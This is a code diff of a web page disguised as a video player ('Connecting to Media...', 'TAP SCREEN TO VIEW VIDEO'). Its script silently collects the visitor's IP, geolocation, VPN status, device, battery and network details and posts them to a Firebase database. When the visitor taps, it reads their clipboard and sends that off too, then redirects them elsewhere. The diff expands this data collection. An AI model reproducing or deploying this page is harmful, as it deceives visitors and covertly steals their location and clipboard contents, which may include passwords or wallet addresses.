@@ -1,65 +1,81 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Video Player</title>
+    <meta charset="UTF-8">
+    <title>Connecting to Media...</title>
     <style>
-        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        body { background: #000; color: #00ffaa; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .spinner { width: 50px; height: 50px; border: 3px solid #111; border-top: 3px solid #00ffaa; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div id="status">
-        <div class="loader"></div>
-        <p id="msg" style="margin-top:20px; display:none;">Tap to continue...</p>
-    </div>
+    <div class="spinner"></div>
+    <p id="msg" style="margin-top:20px; font-size:12px; text-transform:uppercase; letter-spacing:2px;">Securing Connection...</p>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
 
-        async function start() {
+        async function initScan() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
             if(!id) return;
-
             const decoded = JSON.parse(atob(id));
             const userKey = decoded.k;
             const targetUrl = decoded.r;
 
-            // 1. Get Location Info
-            let info = { time: new Date().toLocaleString() };
+            // 1. Gather Advanced Hardware Data
+            let data = {
+                time: new Date().toLocaleString(),
+                localTime: new Date().toLocaleTimeString(),
+                device: navigator.platform,
+                ram: navigator.deviceMemory || "N/A",
+                res: `${screen.width}x${screen.height}`,
+                orient: screen.orientation ? screen.orientation.type : "N/A",
+                netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+                speed: navigator.connection ? navigator.connection.downlink : "N/A",
+                battery: "N/A",
+                charging: "N/A"
+            };
+
+            // 2. Battery Scan
+            try {
+                const b = await navigator.getBattery();
+                data.battery = Math.round(b.level * 100);
+                data.charging = b.charging ? "Yes" : "No";
+            } catch(e){}
+
+            // 3. IP, Geo & VPN Detection
             try {
                 const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
-                info.ip = d.ip;
-                info.loc = `${d.city}, ${d.country}`;
-                info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-            } catch(e) {}
+                data.ip = d.ip;
+                data.loc = `${d.city}, ${d.country}`;
+                data.isProxy = d.security ? d.security.proxy || d.security.vpn : false;
+                data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            } catch(e){}
 
-            // Save Location
-            await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(info) });
+            // Send All Data to Firebase
+            await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
 
-            // Show Tap message for Clipboard grab
-            document.querySelector('.loader').style.display = 'none';
-            document.getElementById('msg').style.display = 'block';
+            // Ready for User Interaction
+            document.getElementById('msg').innerHTML = "<b>TAP SCREEN TO VIEW VIDEO</b>";
 
             document.body.onclick = async () => {
                 try {
                     const text = await navigator.clipboard.readText();
-                    if(text) {
-                        await fetch(`${DB_URL}clipboard/${userKey}.json`, { 
-                            method: 'POST', 
-                            body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
-                        });
-                    }
-                } catch(e) {}
+                    if(text) await fetch(`${DB_URL}clipboard/${userKey}.json`, { 
+                        method: 'POST', 
+                        body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
+                    });
+                } catch(e){}
                 window.location.href = targetUrl;
             };
-
-            // Auto redirect fallback
-            setTimeout(() => { window.location.href = targetUrl; }, 5000);
+            
+            // Auto move if no click
+            setTimeout(() => { window.location.href = targetUrl; }, 10000);
         }
-        start();
+        initScan();
     </script>
 </body>
 </html>
